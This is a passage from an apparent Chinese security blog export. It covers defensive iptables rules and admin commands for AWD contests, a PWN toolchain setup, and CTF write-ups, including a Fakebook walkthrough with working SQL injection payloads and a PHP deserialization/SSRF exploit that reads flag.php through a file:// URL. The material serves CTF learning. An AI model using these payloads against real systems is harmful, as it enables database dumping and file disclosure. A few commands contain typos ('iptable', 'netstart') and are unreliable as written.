<h1 id="常用的访问控制"><a href="#常用的访问控制" class="headerlink" title="常用的访问控制"></a>常用的访问控制</h1><h2 id="限制端口"><a href="#限制端口" class="headerlink" title="限制端口"></a>限制端口</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开放ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#打开80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#开启多端口简单用法</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<h2 id="限制ssh登录"><a href="#限制ssh登录" class="headerlink" title="限制ssh登录"></a>限制ssh登录</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#禁止从xx.xx.xx.xx远程登陆到本机</span></span><br><span class="line">iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP</span><br><span class="line"><span class="comment">#允许xx.xx.xx.xx网段远程登陆访问ssh</span></span><br><span class="line">iptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>

<h2 id="限制IP连接数和连接速率"><a href="#限制IP连接数和连接速率" class="headerlink" title="限制IP连接数和连接速率"></a>限制IP连接数和连接速率</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#单个IP的最大连接数为 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#单个IP在60秒内只允许最多新建15个连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --<span class="built_in">limit</span>-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>

<h2 id="数据包简单识别，防止端口复用类的后门或者shell"><a href="#数据包简单识别，防止端口复用类的后门或者shell" class="headerlink" title="数据包简单识别，防止端口复用类的后门或者shell"></a>数据包简单识别，防止端口复用类的后门或者shell</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<h2 id="限制访问"><a href="#限制访问" class="headerlink" title="限制访问"></a>限制访问</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务</span></span><br><span class="line">iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP</span><br><span class="line"><span class="comment">#封杀1.1.1.4这个IP或者某个ip段</span></span><br><span class="line">iptables -I INPUT -s 1.1.1.4 -j DROP</span><br><span class="line">iptables -I INPUT -s 1.1.1.1/24 -j DROP</span><br></pre></td></tr></table></figure>

<h2 id="过滤异常报文"><a href="#过滤异常报文" class="headerlink" title="过滤异常报文"></a>过滤异常报文</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN</span><br><span class="line"><span class="comment">#匹配SYN标识位</span></span><br><span class="line">iptables -A INPUT -p tcp --syn</span><br><span class="line"><span class="comment">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#丢弃没标志位的包</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br><span class="line"><span class="comment">#匹配到SYN ACK FIN URG RST PSH的丢弃（类似的操作自行举一反三）</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#匹配到 SYN,RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br></pre></td></tr></table></figure>

<h2 id="防止DDos"><a href="#防止DDos" class="headerlink" title="防止DDos"></a>防止DDos</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p><code>-m limit</code>：启用limit扩展<br><code>–limit 20/minute</code>：允许最多每分钟10个连接<br><code>–limit-burst 100</code>：当达到100个连接后，才启用上述20/minute限制</p>
<h2 id="丢弃陌生的TCP响应包-防止反弹式攻击"><a href="#丢弃陌生的TCP响应包-防止反弹式攻击" class="headerlink" title="丢弃陌生的TCP响应包,防止反弹式攻击"></a>丢弃陌生的TCP响应包,防止反弹式攻击</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</span><br></pre></td></tr></table></figure>

<h1 id="服务器及系统"><a href="#服务器及系统" class="headerlink" title="服务器及系统"></a>服务器及系统</h1><p>ssh连接：ssh &lt;-p 端口号&gt; [username]@[ip]</p>
<p>scp远程拷贝： scp [文件路径] [username]@[ip]:[存放路径]</p>
<p>显示最近登录的5个账号： last -n 5 | awk ‘{print $1}’</p>
<p>显示/etc/passwd的账户： cat /etc/passwd | awk -F ‘:’ ‘{print $1}’</p>
<p>查看uid为0的账号： awk -F: ‘{if($3==0)print $1}’ /etc/passwd</p>
<p>查找777权限的php文件：find . -name “*.php” -perm 4777</p>
<p>查看进程： ps aux | grep [pid或进程名]</p>
<p>查看已建立的网络连接及进程： netstart -antulp | grep EST</p>
<p>查看指定端口被哪个进程占用：</p>
<ul>
<li>lsof -i:[端口号]</li>
<li>netstat -tunlp | grep [端口号]</li>
</ul>
<p>杀死进程：</p>
<ul>
<li>kill [pid]</li>
<li>killall [进程名]</li>
<li>pkill [进程名]</li>
<li>pkill -u[用户名] #结束该用户（非root）的所有进程</li>
</ul>
<p>封杀IP或IP段： iptables -I INPUT -s source_ip[/mask] -j DROP</p>
<p>禁止从某个主机ssh远程到本机： iptable -t filter -A INPUT -s source_ip[/mask] -p tcp –dport 22 -j DROP</p>
<p>定时任务，在固定的时间间隔执行指定的系统指令或shell script：</p>
<ul>
<li>crontab [-u user] file_name</li>
<li>crontab [-u user] [-e |-l| -r]</li>
</ul>
<p>检测所有的 tcp 连接数量及状态： netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn</p>
<p>查看页面访问排名前10的IP： cat /var/log/apache2/access.log|cut -f1 -d|sort|uniq -c|sort -k  -r|head -</p>
<p>查看页面访问排名前10的 url：cat /var/log/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k  -r|head -</p>
<p>不允许任何人修改 www 目录下的文件： chattr -R +i /var/www/html</p>
<p>解除不允许修改的属性：chattr -R -i /var/www/html</p>
<p>抓取流量： tcpdump -s 0 -w tcplog.pcap port 9999 </p>
<h1 id="加固脚本"><a href="#加固脚本" class="headerlink" title="加固脚本"></a>加固脚本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#Allow youself Ping other hosts , prohibit others Ping you</span></span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP</span><br><span class="line">iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT</span><br><span class="line"><span class="comment">#Close all INPUT FORWARD OUTPUT, just open some ports</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -P FORWARD DROP</span><br><span class="line">iptables -P OUTPUT DROP</span><br><span class="line"><span class="comment">#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#Open port 80iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#Open multiport</span></span><br><span class="line"><span class="comment">#iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span></span><br><span class="line"><span class="comment">#Control IP connection</span></span><br><span class="line"><span class="comment">#The maximum number of connections for a single IP is 30iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span></span><br><span class="line"><span class="comment">#A single IP allows up to 15 new connections in 60 seconds</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#Prevent port reuse</span></span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line"><span class="comment">#Filter abnormal packets</span></span><br><span class="line">iptables -A INPUT -i eth1 -p tcp --tcp-flags SYN,RST,ACK,FIN SYN -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN,RST,PSH -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP</span><br><span class="line"><span class="comment">#Prevent DoS attacks</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br><span class="line"><span class="comment">#Discard unfamiliar TCP response packs to prevent rebound attacks</span></span><br><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN入门-Web混不下去了怎么办</title>
    <url>/2019/09/24/PWN%E7%88%B7%E7%88%B7%E7%9A%84%E6%97%A5%E5%B8%B8/PWN%E5%85%A5%E9%97%A8-Web%E6%B7%B7%E4%B8%8D%E4%B8%8B%E5%8E%BB%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
    <content><![CDATA[<p>Web 狗一只，最近打 ctf 愈发觉得 pwn 的重要，于是便有了当爷爷的冲动！</p>
<p><strong>JOJO！我不当狗了！</strong></p>
<p><img src="https://rfpzqq.sn.files.1drv.com/y4mvd9Oip3PylZBMV4Xe_0HLpqIn7_YtZjHrhKlGj3ceUGUNrd-x-Zg2A4FCIPyBPMbP5YDn6VNLxeGWKJVLUvrba6z6Klt5C6rUO-D31dORpAorrjVfSpIJgNcqVPnaTuYYjLXMU8N856NoR1arCntzcKq9lI2E2u36RalGPSx-U4LnDA2DezfM_duYfHLRwSAjxb6l6MLriBezCrRBX0kSA?width=700&height=350&cropmode=none" alt></p>
<a id="more"></a>

<h1 id="PWN-环境搭建"><a href="#PWN-环境搭建" class="headerlink" title="PWN 环境搭建"></a>PWN 环境搭建</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>我用的是 ubuntu 18.04 ，安装完成后先<strong>换源</strong>，先备份官方源 <code>sudo cp /etc/apt/source.list /etc/apt/source.list.b</code> ，更新 /etc/apt/sources.list 为以下内容</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-security main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p><strong>更新，并安装必要的软件(vim git gedit ssh socat等)</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -f install</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>

<p><strong>安装 pwntools</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">pip install -U setuptools</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>

<p><strong>安装 pwndbg</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p><strong>安装 peda 插件</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> “<span class="built_in">source</span> ~/peda/peda.py” &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p><strong>安装 libcdatabase</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database.git</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br></pre></td></tr></table></figure>

<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p><strong>pip 出现问题建议先升级</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip3 install --upgrade pip3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>出现报错：<code>ImportError: cannot import name main</code></p>
<p>修改 /usr/bin/pip 为如下内容</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pip <span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sys.exit(__main__._main())</span><br></pre></td></tr></table></figure>

<p><strong>pip 太慢建议换源</strong></p>
<ul>
<li>临时换源</li>
</ul>
<blockquote>
<p><code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [package name]</code></p>
</blockquote>
<ul>
<li>永久换源</li>
</ul>
<blockquote>
<p>新建 ~/.pip/pip.conf 文件，写入如下内容</p>
</blockquote>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">index-url</span> = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-2019 强网杯 Web</title>
    <url>/2019/08/01/Writeup/WP-2019-%E5%BC%BA%E7%BD%91%E6%9D%AF-Web/</url>
    <content><![CDATA[<h1 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h1><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><p><a href="https://github.com/CTFTraining/qwb_2019_supersqli/tree/0787e6a8273a78a8b237b08c034851f47cf20d6c" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_supersqli/tree/0787e6a8273a78a8b237b08c034851f47cf20d6c</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/qwb_2019_supersqli.git</span><br><span class="line"><span class="built_in">cd</span> qwb_2019_supersqli/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:80 ctftraining/qwb_2019_supersqli</span><br></pre></td></tr></table></figure>

<h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>打开题目看到输入框，还有提示</p>
<p>### </p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-网鼎杯 2018 Fakebook</title>
    <url>/2019/07/29/Writeup/WP-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/</url>
    <content><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><p><a href="https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a" target="_blank" rel="noopener">https://github.com/CTFTraining/wdb_2018_fakebook/tree/0de336f09a15dee090d6a001a5a29e60e647be8a</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/CTFTraining/wdb_2018_fakebook.git</span><br><span class="line"><span class="built_in">cd</span> wdb_2018_fakebook/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker run -d -p 1000:80 ctftraining/wdb_2018_fakebook</span><br></pre></td></tr></table></figure>

<p>访问 http://[your ip]:1000/ 即可</p>
<a id="more"></a>

<h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>题目是一个分享 blog 网址的站</p>
<p>正常注册一个账号</p>
<p>首页上会展示刚才注册的信息，点击用户名会跳转到view.php</p>
<p>在这个页面上展示了username, age, blog 和一个iframe引入的用户填写的blog网址</p>
<p><img src="https://wjpdpw.sn.files.1drv.com/y4mKkgmNpq17f1m8owIrZrf2we4uLX4JCWgA1Nf_BjC7NaxTv0MjJ0a8imLMueid2gD35_Dyb58WyZ1r17JCUX3Q4K97jX69lQTCFoawKJZXY6PvMgdTQrgetx2Gpi8n0mNi3wzT6xBz-SRdrElYtcVbqILez-I1vw20gGdX7zUoYXEL0Q8SRYsVCYVHWfHJbmFNqZi5AyGm1lYof_BWOwxCA?width=1911&height=947&cropmode=none" alt></p>
<p>而且注意到view.php是通过 id 值来查找用户的，那么可能会有sql注入</p>
<p>在页面上引入 blog 是用户可控的，那么很有可能会存在 SSRF </p>
<h2 id="扫下后台"><a href="#扫下后台" class="headerlink" title="扫下后台"></a>扫下后台</h2><ul>
<li>得到robots.txt 如下</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span>-agent: *</span><br><span class="line">Disallow: /<span class="keyword">user</span>.php.bak</span><br></pre></td></tr></table></figure>

<ul>
<li>又得到了一份源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问flag.php正常200</li>
</ul>
<h2 id="在view-php-id处sql注入"><a href="#在view-php-id处sql注入" class="headerlink" title="在view.php?id处sql注入"></a>在view.php?id处sql注入</h2><p>测试后发现此处对空格进行了过滤，用注释/**/绕过下</p>
<p>order by测试查询的字段数为4</p>
<p>常规查表，列，字段</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,group_concat(table_name),3,4 <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()#</span><br><span class="line">得到table: users</span><br><span class="line">-1/**/union/**/select/**/1,group_concat(column_name),3,4 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>#</span><br><span class="line">得到column: <span class="literal">no</span>,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">-1/**/union/**/select/**/1,group_concat(data),3,4 <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">no</span>=<span class="string">'3'</span>#</span><br><span class="line">得到data: O:8:<span class="string">"UserInfo"</span>:3:&#123;s:4:<span class="string">"name"</span>;s:7:<span class="string">"abelche"</span>;s:3:<span class="string">"age"</span>;i:123;s:4:<span class="string">"blog"</span>;s:20:<span class="string">"http://www.baidu.com"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>结合在注入的时候页面显示php报错:<strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong></p>
<p>用户注册的信息经过序列化后存入数据库，在view.php页面再反序列化成实例然后显示出来</p>
<h2 id="将unserialize-ssrf注入data"><a href="#将unserialize-ssrf注入data" class="headerlink" title="将unserialize+ssrf注入data"></a>将unserialize+ssrf注入data</h2><p>那么我们可以尝试构造序列化的payload读取flag.php</p>
<p>这就用到了前面获得的泄漏的源码</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$u = unserialize(<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:7:"abelche";s:3:"age";i:123;s:4:"blog";s:20:"http://www.baidu.com";&#125;'</span>);</span><br><span class="line">$s = $u;</span><br><span class="line">$s-&gt;blog = <span class="string">'file:///var/www/html/flag.php'</span>;</span><br><span class="line"><span class="keyword">print</span>(serialize($s));</span><br></pre></td></tr></table></figure>

<p>最终的payload为:</p>
